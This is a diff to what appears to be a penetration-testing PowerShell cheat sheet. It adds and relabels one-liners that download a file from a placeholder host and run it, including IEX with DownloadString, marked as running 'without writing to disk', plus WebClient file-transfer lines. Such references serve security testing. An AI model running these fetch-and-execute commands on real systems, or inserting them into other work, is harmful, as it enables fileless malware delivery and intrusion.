@@ -1820,14 +1820,17 @@ Get-ChildItem C:\path\to\directory -Filter *.extension_here -Recurse | Select-S
 # search for a file
 Get-Childitem –Path C:\ -Recurse –force -ErrorAction SilentlyContinue -Include *.extension_here -File
 
-# download file from web server
+# download file from web server + run it 
 IEX(IWR('http://URL_here/file_here'))
+Invoke-WebRequest -Uri http://IP_here/path/to/file -OutFile /path/to/outfile
+
+# download file from web server + run it without writing to disk
 IEX/New-Object Net.WebClient().downloadString('http://IP_here/path/to/file')
 IEX(New-Object Net.WebClient).downloadString('http://IP_here/path/to/file')
-Invoke-WebRequest -Uri http://IP_here/path/to/file -OutFile /path/to/outfile
 
 # transfer file
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://IP_here/file_here','C:\path\to\outfile')"
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://IP_here/path/to/file', '/path/to/outfile')
 
 # read text file
 Get-Content file_name_here
